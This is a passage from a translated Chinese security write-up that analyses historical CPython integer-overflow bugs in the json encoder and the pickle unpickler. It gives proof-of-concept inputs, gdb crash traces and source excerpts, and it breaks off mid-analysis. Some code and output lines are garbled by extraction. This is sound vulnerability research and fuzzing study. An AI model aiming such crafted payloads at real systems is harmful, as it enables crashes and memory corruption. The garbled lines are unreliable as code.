# cpython历史漏洞分析及其fuzzer编写
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 历史漏洞分析
主要历史漏洞来源于[cpython hackerone](https://hackerone.com/ibb-python/hacktivity)  
这篇文章首先分析三个`cpython`历史漏洞，在我们简单熟悉了`cpython`的源码结构以后，再来编写一个`fuzzer`，其实算是添加`fuzzer`
###  Integer overflow in _json_encode_unicode
调试环境
    kali x86
    GNU gdb (Debian 9.2-1) 9.2
    gcc (Debian 9.3.0-13) 9.3.0
漏洞官方[issue](https://bugs.python.org/issue24522)
找到最近的一个未修复漏洞的`commit`
    ➜  cpython git:(master) git log --grep="prevent integer overflow"
    commit bdaeb7d237462a629e6c85001317faa85f94a0c6
    Author: Victor Stinner 
    Date:   Mon Oct 16 08:44:31 2017 -0700
        bpo-31773: _PyTime_GetPerfCounter() uses _PyTime_t (GH-3983)
        * Rewrite win_perf_counter() to only use integers internally.
        * Add _PyTime_MulDiv() which compute "ticks * mul / div"
          in two parts (int part and remaining) to prevent integer overflow.
        * Clock frequency is checked at initialization for integer overflow.
        * Enhance also pymonotonic() to reduce the precision loss on macOS
          (mach_absolute_time() clock).
    commit 7b78d4364da086baf77202e6e9f6839128a366ff
    Author: Benjamin Peterson 
    Date:   Sat Jun 27 15:01:51 2015 -0500
        prevent integer overflow in escape_unicode (closes #24522)
    ➜  cpython git:(master) git checkout -f 7b78d4364da086baf77202e6e9f6839128a366ff
    ➜  cpython git:(7b78d4364d) git log
    commit 7b78d4364da086baf77202e6e9f6839128a366ff (HEAD)
    Author: Benjamin Peterson 
    Date:   Sat Jun 27 15:01:51 2015 -0500
        prevent integer overflow in escape_unicode (closes #24522)
    commit 758d60baaa3c041d0982c84d514719ab197bd6ed //  未修复
    Merge: 7763c68dcd acac1e0e3b
    Author: Benjamin Peterson 
    Date:   Sat Jun 27 14:26:21 2015 -0500
        merge 3.4
    commit acac1e0e3bf564fbad2107d8f50d7e9c42e5ef22
    Merge: ff0f322edb dac3ab84c7
    Author: Benjamin Peterson 
    Date:   Sat Jun 27 14:26:15 2015 -0500
        merge 3.3
    commit dac3ab84c73eb99265f0cf4863897c8e8302dbfd
    Author: Benjamin Peterson 
    Date:   Sat Jun 27 14:25:50 2015 -0500
    ...
    ➜  cpython git:(7b78d4364d) git checkout -f 758d60baaa3c041d0982c84d514719ab197bd6ed
    Previous HEAD position was 7b78d4364d prevent integer overflow in escape_unicode (closes #24522)
    HEAD is now at 758d60baaa merge 3.4
确定漏洞复现`commit: 758d60baaa3c041d0982c84d514719ab197bd6ed`  
使用`gcc`编译该`commit`代码
    ➜  cpython git:(7b78d4364d) export ASAN_OPTIONS=exitcode=0 # clang -fsantize=address 发生错误时不退出
    ➜  cpython git:(7b78d4364d) CC="gcc -g -fsanitize=address" ./configure --disable-ipv6
    ➜  cpython git:(7b78d4364d) make
    ➜  cpython git:(758d60baaa) ./python --version
    Python 3.5.0b2+
使用的`poc.py`
    import json
    sp = "x13"*715827883 #((2**32)/6 + 1)
    json.dumps([sp], ensure_ascii=False)
使用`gdb`调试
    (gdb) b Modules/_json.c:265
    No source file named Modules/_json.c.
    Make breakpoint pending on future shared library load? (y or [n]) y
    Breakpoint 1 (Modules/_json.c:265) pending.
    (gdb) r poc.py
    Starting program: /root/cpython/python poc.py
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
    Breakpoint 1, escape_unicode (pystr=0x85c54800) at /root/cpython/Modules/_json.c:265
    265        rval = PyUnicode_New(output_size, maxchar);
    (gdb) p output_size
    $1 = 
    (gdb) c
    Continuing.
    Program received signal SIGSEGV, Segmentation fault.
    0xb6028131 in escape_unicode (pystr=0x85c54800) at /root/cpython/Modules/_json.c:302
    302            ENCODE_OUTPUT;
可以发现程序确实是崩溃了，但是我们没有看到`output_size`的值，为了观察其值，我们将`Makefile`中的`-O3`优化改为`-O0`,重新编译，再次使用`gdb`调试
    (gdb) b Modules/_json.c:265
    No source file named Modules/_json.c.
    Make breakpoint pending on future shared library load? (y or [n]) y
    Breakpoint 1 (Modules/_json.c:265) pending.
    (gdb) r poc.py
    Starting program: /root/cpython/python poc.py
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
    Breakpoint 1, escape_unicode (pystr=0x85c54800) at /root/cpython/Modules/_json.c:265
    265        rval = PyUnicode_New(output_size, maxchar);
    (gdb) p input_chars
    $1 = 715827883
    (gdb) p output_size
    $2 = 4  PY_SSIZE_T_MAX - d) { // 每次都需要做溢出判断
            PyErr_SetString(PyExc_OverflowError, "string is too long to escape");
            return NULL;
        }
        output_size += d;
    }
    rval = PyUnicode_New(output_size, maxchar);
###  Integer overflow in _pickle.c
漏洞官方[issue](https://bugs.python.org/issue24521)  
利用上面的方法找到最近的未修复`commit:614bfcc953141cfdd38606f87a09d39f17367fa3`
`poc.py`
    import pickle
    pickle.loads(b'I1nrx00x00x00x20x2e')
编译之后直接利用`gdb`调试`poc`(编译不使用`-fsanitize`选项)
    (gdb) r poc.py
    Starting program: /root/cpython/python poc.py
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
    Program received signal SIGSEGV, Segmentation fault.
    0xb7875252 in _Unpickler_ResizeMemoList (self=0xb789c2fc, new_size=1073741824) at /root/cpython/Modules/_pickle.c:1069
    1069            self->memo[i] = NULL;
    (gdb) bt
    #0  0xb7875252 in _Unpickler_ResizeMemoList (self=0xb789c2fc, new_size=1073741824) at /root/cpython/Modules/_pickle.c:1069
    #1  0xb78752da in _Unpickler_MemoPut (self=0xb789c2fc, idx=536870912, value=0x664540 ) at /root/cpython/Modules/_pickle.c:1092
    #2  0xb787d75e in load_long_binput (self=0xb789c2fc) at /root/cpython/Modules/_pickle.c:5028
    #3  0xb787e6bd in load (self=0xb789c2fc) at /root/cpython/Modules/_pickle.c:5409
    #4  0xb78802e4 in pickle_loads (self=0xb78cb50c, args=0xb7931eac, kwds=0x0) at /root/cpython/Modules/_pickle.c:6336
    #5  0x00569701 in PyCFunction_Call (func=0xb789d92c, arg=0xb7931eac, kw=0x0) at Objects/methodobject.c:84
    #6  0x0048f744 in call_function (pp_stack=0xbfffeb80, oparg=1) at Python/ceval.c:4066
    #7  0x0048b279 in PyEval_EvalFrameEx (f=0xb79b584c, throwflag=0) at Python/ceval.c:2679
    #8  0x0048dc95 in PyEval_EvalCodeEx (_co=0xb79355c0, globals=0xb797666c, locals=0xb797666c, args=0x0, argcount=0, kws=0x0, kwcount=0, defs=0x0, defcount=0,
        kwdefs=0x0, closure=0x0) at Python/ceval.c:3436
    #9  0x00482287 in PyEval_EvalCode (co=0xb79355c0, globals=0xb797666c, locals=0xb797666c) at Python/ceval.c:771
    #10 0x004b464a in run_mod (mod=0x701b50, filename=0xb799bd98 "poc.py", globals=0xb797666c, locals=0xb797666c, flags=0xbffff478, arena=0x6aab10)
        at Python/pythonrun.c:1996
    #11 0x004b44ba in PyRun_FileExFlags (fp=0x6f3e80, filename=0xb799bd98 "poc.py", start=257, globals=0xb797666c, locals=0xb797666c, closeit=1,
        flags=0xbffff478) at Python/pythonrun.c:1952
    #12 0x004b3048 in PyRun_SimpleFileExFlags (fp=0x6f3e80, filename=0xb799bd98 "poc.py", closeit=1, flags=0xbffff478) at Python/pythonrun.c:1452
    #13 0x004b251c in PyRun_AnyFileExFlags (fp=0x6f3e80, filename=0xb799bd98 "poc.py", closeit=1, flags=0xbffff478) at Python/pythonrun.c:1174
    #14 0x004ccdc2 in run_file (fp=0x6f3e80, filename=0x6697d0 L"poc.py", p_cf=0xbffff478) at Modules/main.c:307
    #15 0x004cd8e0 in Py_Main (argc=2, argv=0x6661a0) at Modules/main.c:744
    #16 0x0042569a in main (argc=2, argv=0xbffff5d4) at ./Modules/python.c:62
    (gdb) x/10x self->memo
    0x6af900:    0x00000000    0x00000000    0x00000000    0x00000081
    0x6af910:    0x006d2da8    0xb7e8e778    0x00000000    0x00000000
    0x6af920:    0x00000000    0x00000000
    (gdb) x/10x self->memo+i
    0x73d000:    Cannot access memory at address 0x73d000
    (gdb) p new_size
    $3 = 1073741824
    (gdb) p/x new_size
    $4 = 0x40000000
    (gdb) p PY_SSIZE_T_MAX
    No symbol "PY_SSIZE_T_MAX" in current context.
    (gdb) p new_size * sizeof(PyObject *)
    $5 = 0 memo_size
    $9 = 32
可以发现由于整数溢出，已经导致了一个越界写的漏洞。  
根据其调用栈，我们来一步一步分析其溢出的原因  
来看一下最后出错函数
    static int
    _Unpickler_ResizeMemoList(UnpicklerObject *self, Py_ssize_t new_size)
    {
        Py_ssize_t i;
        PyObject **memo;
        assert(new_size > self->memo_size);
        memo = PyMem_REALLOC(self->memo, new_size * sizeof(PyObject *));
        if (memo == NULL) {
            PyErr_NoMemory();
            return -1;
        }
        self->memo = memo;
        for (i = self->memo_size; i memo[i] = NULL;
        self->memo_size = new_size;
        return 0;
    }
根据`gdb`调试显示，由于溢出导致`new_size * sizeof(PyObject *)`数值为`0`，当其为`0`时传入
    #define PyMem_REALLOC(p, n)    ((size_t)(n) > (size_t)PY_SSIZE_T_MAX  ? NULL 
                    : realloc((p), (n) ? (n) : 1))
也就是`realloc(p, 1)`，执行成功，接下来就会造成越界写
    self->memo[i] = NULL; // 越界写
继续回溯，看看`new_size`如何得到